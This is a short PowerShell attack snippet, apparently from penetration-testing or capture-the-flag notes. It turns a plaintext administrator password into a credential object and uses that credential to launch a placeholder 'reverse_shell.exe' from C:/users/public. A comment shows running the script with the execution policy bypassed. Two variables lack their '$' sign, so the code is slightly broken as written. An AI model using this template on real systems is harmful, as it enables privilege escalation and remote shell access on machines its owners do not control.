secpasswd = ConvertTo-SecureString "<admin_pass_clear_text>" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("<Admin_username>", $secpasswd)
$computer = "<COMPUTER_NAME>"
[System.Diagnostics.Process]::Start("C:/users/public/<reverse_shell.exe>","", $mycreds.Username, mycreds.Password, $computer)


# powershell -ExecutionPolicy Bypass -File c:\users\public\run.ps1
